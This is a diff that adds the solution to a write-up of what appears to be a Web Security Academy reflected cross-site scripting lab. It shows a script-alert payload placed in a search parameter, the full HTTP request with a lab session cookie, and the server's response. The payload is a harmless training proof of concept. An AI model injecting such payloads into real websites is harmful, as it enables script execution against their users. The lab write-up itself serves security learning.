@@ -39,3 +39,39 @@ Content-Type: text/html; charset=utf-8
 X-Frame-Options: SAMEORIGIN
 Content-Length: 3467
 #+end_src
+
+** Solution
+Since we know the search input field is accepting any user input without filtering the user input, attacker can craft a vulnerability code to execute through this functionality
++ Now we can craft a js code along with search term
+  #+begin_src js
+<script>alert("Hello World")</script>
+  #+end_src
+
++ Request
+  #+begin_src
+GET /?search=bells<script>alert("Hello+World")<%2Fscript> HTTP/2
+Host: 0a32001d03b7ceeac1795d0c00130080.web-security-academy.net
+Cookie: session=9Tp4tvzKzoZgjf6TiTDKGzULMfJDxuUj
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Dnt: 1
+Referer: https://0a32001d03b7ceeac1795d0c00130080.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+  #+end_src
++ Response
+  #+begin_src
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 4886
+  #+end_src
+
+*** Result
+[[img:./lab01-1.png][Final Result]]
